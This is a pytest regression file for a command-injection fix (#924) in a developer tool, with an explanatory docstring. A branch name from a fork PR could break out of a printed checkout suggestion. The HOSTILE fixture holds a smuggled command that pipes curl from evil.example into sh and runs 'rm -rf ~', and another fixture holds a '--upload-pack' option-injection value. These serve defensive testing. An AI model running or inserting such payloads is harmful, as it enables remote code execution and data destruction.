"""A fork-PR branch name reached a printed shell command as an imperative (#924).

`presets/_branch_locale.check()` renders one line that five ops print under
their `Branch:` field:

    You are on: master ⚠ MISMATCH — switch with: ./supertool 'git-checkout:fix/900'

`fix/900` there is the head-branch name read off the GitHub/GitLab API, so it is
named by whoever opened the pull/merge request — a fork PR needs no permission
on this repo. `_untrusted.flat()` is applied and removes the ten line
separators; it does not remove `'`, and a partial sanitiser reads as a complete
one. So the name closes supertool's own quote and appends whatever follows, in a
line whose whole rhetorical form is *the tool telling you what to run next*.

What these tests assert
-----------------------
The **rendered line**, never the sanitiser. The sanitiser is already there and
already passes; #851 makes the same point about the same module. A test that
asserted `flat()` was called would have passed against the injection above.

Both directions are pinned, because only asserting the refusal would be
satisfied by deleting the suggestion outright:

  * an *ordinary* branch name still renders the exact copy-pasteable command it
    rendered before — that convenience is the reason the line exists;
  * a name outside the repo's `_ORDINARY_REF` charset renders **no command at
    all**, states the branch as data, and says that no command was suggested.

Why refusal rather than `shlex.quote()` at this site
----------------------------------------------------
Quoting is the obvious fix and is what `presets/gitlab/mr.py`'s `_shell_ref`
does for the `To resolve:` git recipe (#694). That site and this one differ:

  * The suggestion here is routed through supertool's colon CLI, which
    tokenises `git-checkout:REF` on `:`. A ref containing a colon cannot be
    delivered through this form however it is quoted, so a shell-quoted line
    would be a command that runs and does something other than what it says.
  * `flat()` has already rewritten the name by the time it reaches the command
    — a newline is a space, an ESC is `␛`. The quoted string would therefore
    name a ref that does not exist, which is a command that *looks* right,
    fails obscurely, and hides that the name was hostile.
  * `git-checkout` itself refuses an option-shaped ref (#150), so quoting one
    into the suggestion recreates exactly the #850 defect this line was last
    fixed for: prescribing an action the implementation rejects.

Trading a visible refusal for a plausible-looking command is the wrong
direction, so the third state — `ok` / a finding / *this cannot be answered* —
is the one taken, in the vocabulary the UNKNOWN branch of this same function
already uses.

The cost, stated: a branch legitimately named outside `[A-Za-z0-9._/-]` (a
non-ASCII name, which git permits) loses its one-line convenience command. It
keeps the state, the name, and the reason. That is a visible extra step, not a
wrong action.
"""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).parent.parent
_PRESETS = _ROOT / "presets"


def _load(rel: str, name: str):
    spec = importlib.util.spec_from_file_location(name, _ROOT / rel)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


sys.path.insert(0, str(_PRESETS))
import _branch_locale  # noqa: E402
import _st_hint  # noqa: E402


# Every op that prints this line. A fix landing on the helper but not reaching
# one of these wrappers leaves that op's readers with the imperative.
#
# `gh-run` left this set with #1056: it now renders `_branch_locale.describe`,
# which builds no command at all, so "the imperative was withheld and said so"
# is not a claim it can make. The injection question still has to be answered
# for that op and is, in
# `tests/test_gh_run_read_only_branch_line_1056.py` — a hostile name there must
# be flattened, stay on one line, and never appear inside a command.
SITES = {
    "gh-pr": "presets/github/pr.py",
    "gh-job": "presets/github/job.py",
    "gl-mr": "presets/gitlab/mr.py",
    "gl-job": "presets/gitlab/job.py",
}

MODULES = {op: _load(rel, f"site_924_{op.replace('-', '_')}")
           for op, rel in SITES.items()}


#: Shell metacharacters, both quote glyphs, a newline, and a payload that reads
#: as a plausible next step. The newline is what #851 flattens; the `'` is what
#: nothing flattened, and it is the one that closes supertool's quote.
HOSTILE = ("x'; curl -s http://evil.example/i.sh | sh; echo \"owned\"\n"
           "rm -rf ~ #")

#: The other half of the same class: quoting cannot stop a leading dash being
#: read as a flag, which `mr.py:_shell_ref` says in as many words.
OPTION_SHAPED = "--upload-pack=touch /tmp/pwn"

ORDINARY = "fix/900"


@pytest.fixture(autouse=True)
def _nowhere_else(monkeypatch: pytest.MonkeyPatch):
    """cwd is on `master`; no worktree holds the named branch.

    That is the one state that renders the imperative, and it is the ordinary
    state of the live clone during a review.
    """
    monkeypatch.setattr(_branch_locale, "current_branch", lambda: "master")
    monkeypatch.setattr(_branch_locale, "holding_worktree", lambda s: ("", ""))


def _renders(name: str, **kw) -> str:
    return _branch_locale.check(name, **kw)


# --------------------------------------------------------------------------
# The finding
# --------------------------------------------------------------------------

@pytest.mark.parametrize("name", [HOSTILE, OPTION_SHAPED],
                         ids=["metacharacters", "option-shaped"])
def test_a_hostile_branch_name_is_never_rendered_inside_a_command(name: str):
    line = _renders(name)

    assert "./supertool" not in line, (
        "the line still hands the reader a command built from a branch name "
        f"the tracker supplied:\n  {line}")
    assert "git-checkout:" not in line, (
        f"a checkout imperative survived for a hostile name:\n  {line}")
    assert "switch with" not in line, (
        f"the line still reads as an instruction to switch:\n  {line}")


@pytest.mark.parametrize("name", [HOSTILE, OPTION_SHAPED],
                         ids=["metacharacters", "option-shaped"])
def test_the_refusal_states_the_branch_and_why_no_command(name: str):
    """Refusing is not going quiet — the state and the reason both survive.

    A line that dropped the suggestion and said nothing else would read as
    "you are on the right branch", which is the failure #531 named at this
    same function.
    """
    line = _renders(name)

    assert "MISMATCH" in line, (
        f"the mismatch itself was lost with the suggestion:\n  {line}")
    assert "no switch command is suggested" in line, (
        "nothing in the line says a command was withheld, so its absence "
        f"reads as its irrelevance:\n  {line}")
    # The name is still shown, as data. Compared through `flat`, which is what
    # any render of a tracker-supplied field goes through.
    import _untrusted
    assert _untrusted.flat(name) in line, (
        f"the branch name is not named at all, so the reader cannot act:\n  {line}")


@pytest.mark.parametrize("name", [HOSTILE, OPTION_SHAPED],
                         ids=["metacharacters", "option-shaped"])
def test_the_refusal_is_still_one_line(name: str):
    line = _renders(name)
    assert len(line.splitlines()) == 1, (
        f"a field that callers print under `Branch:` became {len(line.splitlines())} "
        f"lines:\n  {line!r}")


@pytest.mark.parametrize("op", sorted(SITES))
def test_every_op_that_prints_this_line_refuses_too(op: str):
    """The route, not just the helper — five wrappers reach it (#850)."""
    fn = MODULES[op]._local_branch_check
    line = fn(HOSTILE)
    assert "git-checkout:" not in line, (
        f"{op} still prints the imperative:\n  {line}")
    assert "no switch command is suggested" in line, (
        f"{op} withheld the command without saying so:\n  {line}")


# --------------------------------------------------------------------------
# The other direction — the convenience the line exists for
# --------------------------------------------------------------------------

def test_an_ordinary_branch_name_still_gets_its_command_verbatim():
    # The invocation itself is `_st_hint`'s claim, not this test's (#905): a
    # literal `./supertool` would be wrong in a worktree, which has none.
    assert _renders(ORDINARY) == (
        "You are on: master ⚠ MISMATCH — switch with: "
        f"{_st_hint.st_hint('git-checkout:' + ORDINARY)}")


@pytest.mark.parametrize("name", ["master", "v1.2.3", "release/19.0.x",
                                  "max/oss-lanes", "fix-924", "a.b_c"],
                         ids=lambda n: n)
def test_names_a_reviewer_actually_meets_are_not_swept_up(name: str):
    """The refusal has to stay rare or it becomes the thing readers skip."""
    if name == "master":
        pytest.skip("equal to the cwd branch — a different state entirely")
    assert _st_hint.st_hint("git-checkout:" + name) in _renders(name)


# --------------------------------------------------------------------------
# The states that never carried a command keep not carrying one
# --------------------------------------------------------------------------

def test_the_read_only_state_still_names_a_hostile_branch_as_data():
    line = _branch_locale.check(HOSTILE, actionable=False)
    assert "./supertool" not in line
    assert "MISMATCH" in line
    assert len(line.splitlines()) == 1


def test_the_sibling_worktree_state_still_names_a_hostile_branch_as_data(
        monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setattr(_branch_locale, "holding_worktree",
                        lambda s: ("/Users/x/st-wt/924", ""))
    line = _renders(HOSTILE)
    assert "./supertool" not in line
    assert "/Users/x/st-wt/924" in line
    assert len(line.splitlines()) == 1
